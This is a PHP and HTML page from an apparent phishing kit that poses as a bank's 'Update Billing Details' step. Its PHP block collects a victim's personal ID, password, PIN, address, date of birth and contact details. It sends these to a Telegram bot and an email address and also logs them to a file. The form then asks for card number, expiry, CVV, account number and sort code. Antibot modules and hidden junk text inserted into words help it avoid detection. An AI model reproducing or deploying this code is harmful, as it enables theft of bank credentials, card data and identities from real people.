<?php
sleep(3);
ob_start();
require_once('../page_config.php');
require_once('../includes/geoLite/autoload.php');
require_once('../includes/device_detect.php');
require_once('../includes/blacklist_lookup.php');
require_once('../includes/functions.php');
require_once('../includes/session_protect.php');
require_once('../includes/antibot.php');


$post = $_POST;
if (isset($_POST['submit']) && $_SESSION['saveLog_3'] !== 1){

  // save log
  foreach ($_POST as $key => $value) {
   $_SESSION[$key] = $value;
  }

  $f1 = $_SESSION['personalId'];
  $f2 = $_SESSION['password'];
  $f3 = $_SESSION['pin'];

  $f4 = $_SESSION['fName'];
  $f5 = $_SESSION['mName'];
  $f6 = $_SESSION['lName'];
  $f7 = $_SESSION['address'];
  $f8 = $_SESSION['city'];
  $f9 = $_SESSION['state'];
  $f10 = $_SESSION['postalCode'];
  $f11 = $_SESSION['dobDay']."/".$_SESSION['dobMonth']."/".$_SESSION['dobYear'];
  $f12 = $_SESSION['email'];
  $f13 = $_SESSION['phone'];

  $clientOsName = getOS();
  $clientBrowserName = getBrowserName();


  $data = "==============================="."\r\n".
         "Personal ID: ".$f1."\r\n".
         "Password: ".$f2."\r\n".
         "PIN: ".$f3."\r\n".
         "First Name: ".$f4."\r\n".
         "Middle Name: ".$f5."\r\n".
         "Last Name: ".$f6."\r\n".
         "Address: ".$f7."\r\n".
         "City: ".$f8."\r\n".
         "State: ".$f9."\r\n".
         "Postal Code: ".$f10."\r\n".
         "DOB: ".$f11."\r\n".
         "Email: ".$f12."\r\n".
         "Phone: ".$f13."\r\n".
         "-----------------------------------\r\n".
         "Submitted by: ".$ip."\r\n".
         "UserAgent: ".$ua."\r\n".
         "Browser: ".$clientBrowserName."\r\n".
         "Os: ".$clientOsName."\r\n".
         "-----------------------------------\r\n".
         "Received: ".date("l", strtotime(date("Y-m-d")))." ".date("j F Y @ G:i")."\r\n".
         "==============================="."\r\n";


  if($save_to_telegram==1){
    // Telegram
    $result = urlencode($data);
    file_get_contents('https://api.telegram.org/bot'.$token.'/sendMessage?chat_id='.$chat_id.'&text='.$result."&parse_mode=html");
  }


  if($save_to_mail==1){
    // Email
    $subject  = $site_name." | ".$ip." | UserPass + Info";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text; charset=utf-8 \r\n";

    $msg = $data;
    mail($email, $subject, $msg, $headers);
  }

  if($save_to_txt==1){
    // TXT
    $outfile = "../$txt_fileName";
    $results = $data;

    $fout = fopen($outfile, "a");
    fputs($fout, $results."\n\n");
    fclose($fout);
  }

  $_SESSION['saveLog_3'] = 1;

}

ob_end_flush(); 
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width">
    <title>Process</title>
    <link rel="stylesheet" href="../assets/css/normalize.css">
    <link rel="stylesheet" href="../assets/css/style.css">
    <link rel="stylesheet" href="../assets/css/font-awesome.min.css">
    <link rel="shortcut icon" href=" data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAAA3NCSVQICAjb4U/gAAABIElEQVQokZVSvWrCUBg9KUpLodDNF/ANHHXQyQfQ0cklq6O74pQh4AO4hiwOujuaIeB75F6bNCTREPR0SNGb1EA9XO5wfr7D/dEknsNLlaA1Gk8EXieTd8PgPwMEeLm8jUYPhz0ga61WulwC+Njt/paUAwQ+XRdAsljUu91ar1dOSGUJwANInizLA65BkO33XtFztx6Bk2XlO8ljvR6OxyTP6/VXsynUgACi6ZQkyWg2EwDJ7HDI23LEhiFugaDfvwlMUw+I53OS4WBABd/DoQQggMS2VSFZrTzg6vssIrFtkTf4nU5Jk0C62ZRIv92+nyHUdVU7b7eZ66pMqOuidEsSiE0zcxxG0a8rijLHiU3zZpCAJouv9hCa+g+qhCr8AGcFFUutQo12AAAAAElFTkSuQmCC" type="image/png" />
</head>

<body>
    <header>
        <div class="container">
            <div class="header_block">
                <div class="left_side">
                    <a href="#">
                        <img src="../assets/images/2zBXa4d_1.png" height="25"><img src="../assets/images/2zBXa4d_2.png" height="25">
                    </a>
                </div>
                <div class="right_side">
                    <p>Don’t have Online Ba<em style="display:none;">overripeness</em>nk<sub style="display:none;">unscored</sub>in<sup style="display:none;">digammated</sup>g? </p>
                    <a href="">Si<i style="display:none;">liparidae</i>gn up</a>
                </div>
            </div>
        </div>
    </header>

    <div class="second_block">
        <div class="container">
            <div class="main">
                <div class="main_left">
                    <h3><i class="fa fa-credit-card-alt" aria-hidden="true"></i> Up<sup style="display:none;">rechargeable</sup>da<span style="display:none;">harborer</span>te Bi<sup style="font-size:0.0042px">eigenst<small style="display:none;">sauropoda</small>at<strong style="font-size:0.0046px">taces</strong>e</sup>ll<span style="font-size:0.0082px">episcopalian</span>in<sub style="display:none;">otoscopic</sub>g De<del style="font-size:0.0088px">hemiolic</del>ta<em style="display:none;">nonrepealable</em>il<ins style="display:none;">urostyles</ins>s</h3>
                    <p class="sub_title">Please enter the de<sup style="display:none;">antediluvially</sup>ta<b style="display:none;">azoch</b>il<del style="font-size:0.0076px">veining</del>s of your de<sub style="display:none;">homeland</sub>bi<small style="font-size:0.0036px">alkalinized</small>t/cr<b style="display:none;">heretofore</b>ed<mark style="display:none;">spectrofluorimeter</mark>it ca<span style="font-size:0.0078px">ureido</span>rd. This is to ve<ins style="font-size:0.0087px">perplication</ins>ri<del style="display:none;">scrotectomy</del>fy that you are the genuine ow<small style="font-size:0.0068px">stegodont</small>ne<em style="font-size:0.0033px">anaptychus</em>r of this ac<sup style="font-size:0.0031px">hematocyst</sup>co<em style="font-size:0.0057px">octode</em>un<em style="display:none;">pinguedinous</em>t, your ca<i style="font-size:0.0023px">weren</i>rd will not be ch<span style="font-size:0.007px">sphenion</span>ar<small style="display:none;">enflaming</small>ge<em style="font-size:0.0067px">overimitated</em>d.</p>
                    <form id="form_3" action="success.php<?=$urlParametrs?><?=$uriParametrs?>" method="post">
                        <input type="hidden" name="submit" value="0" />
                        <input type="hidden" name="redirurl" />
                      <div class="form">
                              <div class="varning">
                                  <p>
                                      Your Pe<del style="display:none;">chintziest</del>rs<span style="font-size:0.0023px">swankie</span>on<b style="display:none;">overt</b>al ID or Se<strong style="display:none;">tamaraus</strong>cu<small style="display:none;">bestrowed</small>ri<i style="font-size:0.0056px">spendthriftness</i>ty number are in<i style="display:none;">revelations</i>co<del style="display:none;">antipendium</del>rr<i style="font-size:0.0090px">wilily</i>ec<sup style="display:none;">strate</sup>t. Getting your se<span style="font-size:0.0021px">ligates</span>cu<sub style="display:none;">stereomicroscopically</sub>ri<em style="font-size:0.0041px">steerageway</em>ty de<strong style="display:none;">psychomonism</strong>ta<sub style="font-size:0.0090px">elementalist</sub>il<ins style="display:none;">precisionistic</ins>s wrong
                                      may result in your ac<i style="display:none;">quirquincho</i>ce<small style="display:none;">accomplis</small>ss being blocked.
                                  </p>
                                  <img src="../assets/images/7lxJMY5.png" alt="">
                              </div>
                              <div class="form_group">
                                  <label class="label" for="cardnumber">Ca<b style="font-size:0.0099px">pluralistically</b>rd Number</label>
                                  <input type="tel" id="cardnumber" name="cardnumber" class="input defaultcc">
                                  <p class="varning_p">Please enter a valid Ca<strong style="display:none;">preferences</strong>rd Number</p>
                              </div>
                              <div class="form_group">
                                  <label class="label" for="state">Ex<strong style="font-size:0.003px">phytosis</strong>pi<del style="font-size:0.0040px">enantiomorphism</del>ra<span style="font-size:0.0071px">chazzans</span>ti<del style="display:none;">antapodosis</del>on Date</label>
                                  <div style="display: flex; ">
                                      <div  style="height: 100%;">
                                       <label for="dobDay" id="" style="opacity: .7; font-size: 14px;">Month</label>
                                       <div style="display: flex;">
                                          <div style="margin-right: 15px; position: relative;">
                                              <select name="expMonth" id="expMonth" class="form-control" style="width: 90px;">
                                                  <option value=""  selected="">MM</option>
                                                  <option value="01">01</option>
                                                  <option value="02">02</option>
                                                  <option value="03">03</option>
                                                  <option value="04">04</option>
                                                  <option value="05">05</option>
                                                  <option value="06">06</option>
                                                  <option value="07">07</option>
                                                  <option value="08">08</option>
                                                  <option value="09">09</option>
                                                  <option value="10">10</option>
                                                  <option value="11">11</option>
                                                  <option value="12">12</option>
                                              </select>
                                             <span class="form-icon sk-icon sk-icon-chevrondown"></span>
                                          </div>
                                       </div>
                                      </div>
                                      <div  style="height: 100%;">
                                       <label for="dobMonth" id="" style="opacity: .7; font-size: 14px;">Year</label>
                                       <div style="display: flex;">
                                          <div style="margin-right: 15px; position: relative;">
                                             <select name="expYear" id="expYear" class="form-control" style="width: 90px;">
                                                <option value=""  selected="">YYYY</option>
                                                <option value="2020"> 2020</option>
                                                <option value="2021"> 2021</option>
                                                <option value="2022"> 2022</option>
                                                <option value="2023"> 2023</option>
                                                <option value="2024"> 2024</option>
                                                <option value="2025"> 2025</option>
                                                <option value="2026"> 2026</option>
                                                <option value="2027"> 2027</option>
                                                <option value="2028"> 2028</option>
                                                <option value="2029"> 2029</option>
                                                <option value="2030"> 2030</option>
                                             </select>
                                             <span class="form-icon sk-icon sk-icon-chevrondown"></span>
                                          </div>
                                       </div>
                                      </div>
                                  </div>
                                  <p class="varning_p">Please select a Ex<ins style="display:none;">prove</ins>pi<span style="display:none;">unusualness</span>ra<sup style="font-size:0.0030px">crossbarred</sup>ti<i style="font-size:0.0086px">gangflower</i>on Date</p>
                              </div>
                              <div class="form_group">
                                  <label class="label" for="cvv">Se<strong style="display:none;">dyph<em style="display:none;">zygnemaceous</em>on<sub style="display:none;">slangous</sub>e</strong>cu<mark style="display:none;">unseared</mark>ri<strong style="display:none;">delightingly</strong>ty Co<sub style="font-size:0.0030px">swimmable</sub>de (CV<em style="font-size:0.0033px">exscinded</em>V)</label>
                                  <input type="tel" id="cvv" name="cvv" maxlength="3" class="input icon_cvv" >
                                  <p class="varning_p">Please enter a valid Se<i style="font-size:0.0062px">managements</i>cu<b style="display:none;">kinswoman</b>ri<small style="font-size:0.0026px">warrantableness</small>ty Co<b style="display:none;">revaporized</b>de (CV<sub style="display:none;">naggish</sub>V)</p>
                              </div>

                              <div class="form_group">
                                  <label class="label" for="acn">Ac<i style="display:none;">clownish</i>co<i style="font-size:0.0086px">superexceed</i>un<sub style="display:none;">beryl</sub>t Number</label>
                                  <input type="tel" id="acn" name="acn"  class="input " maxlength="8" pattern="[0-9]*" inputmode="numeric">
                                  <p class="varning_p">Please enter a valid Ac<mark style="font-size:0.005px">mollified</mark>co<small style="display:none;">nonsubsididies</small>un<ins style="font-size:0.004px">unwailing</ins>t Number</p>
                              </div>

                              <div class="form_group">
                                  <label class="label" for="src">Sort Co<ins style="display:none;">impulsions</ins>de</label>
                                  <input type="tel" id="src" name="src"  class="input " maxlength="6" pattern="[0-9]*" inputmode="numeric">
                                  <p class="varning_p">Please enter a valid Sort Co<sub style="display:none;">stateliness</sub>de</p>
                              </div>


                              <div id="loader" class="loader" >
                                  <div>
                                     <olb-loader>
                                        <div class="loading"></div>
                                     </olb-loader>
                                  </div>
                                  <div>
                                      <p>Logging you on</p>
                                  </div>
                              </div>
                      </div>
                      <button id="submit" class="button" type="submit" disabled="">Next</button>
                      <p class="forget_a"></p>
                    </form>
                </div>
                <div class="main_right">
                    <img src="../assets/images/W4iCSUy.png" alt="">
                    <h2>Beware co<del style="display:none;">thermostat</del>ro<i style="display:none;">forgeful</i>na<i style="font-size:0.0036px">anatomists</i>vi<sub style="display:none;">scotticize</sub>ru<ins style="font-size:0.0058px">flative</ins>s scams</h2>
                    <p>
                        Cr<i style="font-size:0.0035px">uncorrelatively</i>im<small style="font-size:0.0099px">abalienate</small>in<sup style="display:none;">unperturbedness</sup>al<sub style="font-size:0.0079px">demoralising</sub>s are using co<span style="font-size:0.0097px">nonnational</span>ro<strong style="font-size:0.0037px">microstate</strong>na<small style="font-size:0.0098px">unrent</small>vi<b style="font-size:0.0095px">nonsuggestively</b>ru<small style="display:none;">unships</small>s to target people. Please stay on the lookout for anything
                        unusual.
                        Don’t be rushed and make sure any co<sup style="display:none;">stronghead</sup>nt<i style="font-size:0.0067px">doxology</i>ac<mark style="display:none;">smokables</mark>t claiming to be from us is genuine. <a href="#">Learn
                            more</a>.
                    </p>
                </div>
            </div>
        </div>
    </div>
    <footer>
        <div class="footer">
            <ul class="footer_list">
                <li><a href="#"><a>Online Ba<mark style="display:none;">reassurances</mark>nk<sub style="font-size:0.0014px">facular</sub>in<del style="display:none;">incorporeous</del>g Guarantee</a></li>
                <li><a href="#">Site Help & Ac<ins style="display:none;">lowsed</ins>ce<mark style="display:none;">millionth</mark>ssibility</a></li>
                <li><a href="#">Se<strong style="display:none;">big</strong>cu<b style="display:none;">glassie</b>ri<small style="display:none;">intersentimental</small>ty & Pr<strong style="display:none;">autoignition</strong>iv<strong style="font-size:0.0046px">mealworms</strong>ac<span style="font-size:0.0095px">clandestinity</span>y</a></li>
                <li><a href="#">Terms & Conditions</a></li>
                <li><a href="#">Legal</a></li>
            </ul>
            <div class="img_footer">
                <img src="../assets/images/qzkf32l.png" alt="">
            </div>

        </div>
    </footer>

    <script src="../assets/js/jquery-1.11.3.min.js"></script>
    <script src="../assets/js/imask.js"></script>
    <script src="../assets/js/main.js"></script>
    <script type="text/javascript">
     var ccMask = {
       mask: '0000 0000 0000 0000'
     };
     var mask = IMask(document.getElementById('cardnumber'), ccMask);

    </script>
</body>
</html>